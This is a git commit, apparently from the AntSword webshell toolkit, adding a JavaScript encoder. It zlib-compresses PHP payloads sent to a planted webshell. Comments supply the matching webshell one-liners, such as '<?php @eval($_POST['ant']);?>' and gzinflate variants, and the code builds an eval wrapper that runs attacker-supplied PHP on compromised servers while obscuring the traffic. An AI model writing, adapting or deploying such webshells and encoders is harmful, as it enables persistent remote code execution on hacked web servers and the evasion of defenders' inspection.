38741315fd35e2bbc92cde81b12fe623a617b2a9
Medicean <Medici.Yan@Gmail.com>
2019-01-12 13:13:36 +0800

    (Add php): zlib_deflated_raw 使用 zlib 压缩 payload

---
+++ php/zlib_deflated_raw.js
@@ -0,0 +1,33 @@
+/**
+ * php::zlib_deflated_raw 编码器
+ * Create at: 2019/01/12 00:05:44
+ * zlib 压缩 payload, 适配 shell 见代码处
+ */
+
+'use strict';
+
+var zlib = require('zlib');
+/*
+* @param  {String} pwd   连接密码
+* @param  {Array}  data  编码器处理前的 payload 数组
+* @return {Array}  data  编码器处理后的 payload 数组
+*/
+module.exports = (pwd, data) => {
+  // ##########    请在下方编写你自己的代码   ###################
+  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
+  data[randomID] = zlib.deflateRawSync(data['_']);
+  
+  // <?php @eval($_POST['ant']);?>
+  //data[pwd] = `eval(@gzinflate($_POST[${randomID}]));`;
+  
+  // <?php @eval(@gzinflate($_POST['ant'])); ?>
+  data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate($_POST[${randomID}]));`);
+  
+  // <?php @eval(@gzinflate(base64_decode($_POST['ant']))); ?>
+  // data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate($_POST[${randomID}]));`).toString('base64');
+  
+  // ##########    请在上方编写你自己的代码   ###################
+
+  delete data['_'];
+  return data;
+}
